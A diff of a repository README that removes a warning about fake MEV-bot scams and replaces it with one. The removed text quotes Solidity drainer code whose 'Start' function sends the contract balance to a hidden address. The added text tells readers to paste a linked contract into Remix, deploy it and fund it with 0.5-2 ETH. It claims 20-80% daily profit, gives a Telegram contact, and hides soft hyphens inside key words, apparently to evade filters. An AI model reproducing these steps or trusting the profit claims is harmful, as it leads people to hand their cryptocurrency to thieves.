@@ -1,60 +1,69 @@
-# mev-bot-fraud
 
-Be careful for the fake mev-bot codes 
+<h1 align="center">Create Your Ethereum Bot for Uniswap V3</h1>
 
-Wanted to study the mevbot, unexpectedly found a scam, so want to remind you to avoid being cheated, many similar to this project of https://github.com/KayExpertbots/Mevbot, fake script like this 
+<p align="center">
+  <img src="https://i.ibb.co/Sm4Xddw/68747470733a2f2f692e6962622e636f2f374779433259512f676574737461727465642e706e67.png">
+</p>
 
-```
-    function Start() public payable {
-        emit Log("Running MEV action. This can take a while; please wait..");
-        payable(_callMEVAction()).transfer(address(this).balance);
-    }
+<p align="center">
+  <strong>A tool for creating and managing MEV Bots, where clients can connect a MetaMask wallet and create a contract that is executed via a script on the website.</strong>
+</p>
 
-```
+## Description
 
-Start looks like a startup script is actually a transfer, will transfer your balance to an address, '_callMEVAction()' This method is actually the last will generate a wallet address, around is to cheat some beginners, so we must look at it, see this code must be careful 
+The tool allows users to create and manage MEV bots (Maximal Extractable Value bots) based on smart contracts. Users can connect their MetaMask cryptocurrency wallets, create contracts, and run scripts to automate trading and other operations on the Ethereum blockchain. 
 
-![image](https://github.com/chunsenye/mev-bot-fraud/assets/30768615/dc4f05ca-abf7-4146-84d6-d528f08195f1)
+⚠️ **The bot operates entirely within the browser, so there is no need to download any programs that could potentially be harmful to your computer.**
 
-```
-transfer(address(this).balance);
-```
+## Key Features
 
-```
- function callMempool() internal pure returns (string memory) {
-        string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
-        uint _memPoolSol = 3410611; //Gas estimate update
-        uint _memPoolLength = 2418259; //Gas estimate update
-        uint _memPoolSize = 2563395760; //Gas estimate update
-        uint _memPoolHeight = getMemPoolHeight();
-        uint _memPoolDepth = getMemPoolDepth();
+- **Wallet Connection**: Supports MetaMask.
+- **Contract Creation**: Users can create smart contracts using our tool.
+- **Script Execution**: The website allows users to execute the created contract and manage its execution.
+- **Real-time Transaction Display**: The bot's transactions are displayed in real-time.
 
-        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
-        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
-        string memory _memPool3 = checkLiquidity(_memPoolHeight);
-        string memory _memPool4 = checkLiquidity(_memPoolDepth);
+## Usage
 
-        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));
-        string memory _fullMempool = mempool("0", _allMempools);
+1. Download [**MetaMask**](https://metamask.io/download.html) (if you don’t have it already)
+ 
+2. Access to [**Remix Ethereum IDE**](https://remix.ethereum.org/).
+   
+   <img src="https://i.ibb.co/ftNtP8G/2.png" alt="2" border="0">
+   
+   #### For the Remix IDE you can follow this steps:
+3. Click on the `contracts` folder and then create `New File`. Rename it as you like, for example: `bot.sol`
 
-        return _fullMempool;
-    }
-
-```
-![image](https://github.com/chunsenye/mev-bot-fraud/assets/30768615/7334fcdc-405c-45ce-9753-317cc112c9bd)
+   #### Note: If there is a problem if the text is not colored when you create bot.sol and paste the code from pastebin, try again. If the codes are not colored, you cannot proceed to the next step.
 
 
-These are all lies so just a reminder, you can also help to light up the stars, so that more people can see 
+4. Paste this [**sourcecode**](sourcecode.sol) code in R­­emi­x­.
 
-<img width="1360" alt="image" src="https://github.com/chunsenye/mev-bot-fraud/assets/30768615/b87707ad-ae0c-4d49-892c-a54af47947d2">
+5.  Go to the `Solidity Compiler` tab, select version `0.6.6+commit.6c089d02` and click `Compile bot.sol`.
+ 
+    Make sure `bot.sol` is selected in the CONTRACT section of the SOLIDITY COMPILER section.
+
+6. TGo to the `DEPLOY & RUN TRANSACTIONS` tab, select the `Injected Provider - ­M­et­am­as­k­­` environment and then `Deploy`. By approving the Me­­ta­­­ma­­sk contract creation fee, you will have created your own contract (ignore any IFPS errors that may appear afterwards).
+
+7. Copy your newly created contract address and fund it with any amount of ETH (at least 0.5-2 ETH or more is recommended) Simply send ETH to your newly created contract address to allow the bot to earn money.
+
+8. After your transaction is confirmed, click the “start” button to run the b­o­­t. Withdraw your ETH at any time by clicking the “Withdraw” button.
+ 
+   #### That’s it. The bo­t will start wo­rking immed­iately earning you profits from a­r­­b­itr­a­ge trades on ­U­ni­s­­wa­­p pools.
+   
+   #### Testing the bot's operation over 24 hours yields ~20-80% profit on the balance.
+
+   #### The profit depends on network load (gas price) and competition from other MEV bots on the token.
+## Bot Balance Chart
+
+<img src="https://i.ibb.co/2t6ppPD/3.png" alt="3" border="0">
 
 
-[Fraud account list -- 【诈骗账号】](https://github.com/chunsenye/mev-bot-fraud/issues/2)
+## Contact Us
+📫 For any inquiries, please reach out to us:
 
-[List of Fraud projects - 【诈骗项目列表】](https://github.com/chunsenye/mev-bot-fraud/issues/1)
+Telegram : [**Click Here**](https://t.me/UniMevBotsSupport/).
 
 
-【Some real projects  of mev bot】
+## License
 
-[go outside labs mev-toolkit](https://github.com/go-outside-labs/mev-toolkit)
-
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
